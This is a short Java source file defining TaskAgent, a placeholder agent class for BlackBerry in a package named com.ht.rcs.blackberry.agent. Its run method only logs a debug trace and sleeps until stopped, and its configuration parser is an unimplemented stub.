package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TaskAgent extends Agent {
    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);

    public TaskAgent(int agentStatus) {
        super(Agent.AGENT_TASK, agentStatus, true);

    }

    protected TaskAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");

        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
